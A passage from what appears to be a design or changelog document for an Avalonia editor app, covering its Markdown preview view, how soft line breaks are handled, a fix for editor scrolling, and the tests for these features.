- **The view.** `Views/Editor/MarkdownPreviewView` is the preview: a `ScrollViewer` around LiveMarkdown's renderer, with the note for a file too large. It keeps the line at its top there as what it shows changes (an edit above it, an image loading, a narrower pane), goes to a heading a link names, and says when the user scrolls it. `Views/ProjectFileView` lays the editor, the line between them and the preview out by the mode, and scrolls each with the other. The bar's two parts are styled as one outline for a file that isn't Markdown, in `Themes/ProjectFilesStyles.axaml`.
- **Line breaks.** LiveMarkdown makes every line break one, soft or hard. `Views/SoftBreakInlineNode` takes its line break node's place in the pipeline, and makes a soft break a space only in a renderer with the `joinsoftbreaks` class, which the preview's has.
- **Scrolling the editor.** AvaloniaEdit 12's `TextEditor.ScrollToVerticalOffset` does nothing (its body is commented out), so `CodeEditor.ScrollToVerticalOffset` sets its scroller's offset. That also brings an open file back scrolled where it was at launch, which it hadn't been.
- **Claude Code:** nothing new.

**Tests.** `ReplyImageAddressTests` (a relative path read against another folder), `PreviewScrollTests`, `MarkdownPreviewTests` (the modes and what's saved, the text parsed only while shown and as a change, front matter, the size limit, links to headings, files and the web, a missing file's note, images read against the file's folder, Copy) and `MarkdownPreviewUiTests` (the bar, the preview rendered, **Edit and preview** side by side and following typing, scrolling together both ways and between the modes, a heading link, an image read against the file's folder); `ProjectFilesUiTests` has a file coming back scrolled where it was.

## 19. Open Questions

None right now.
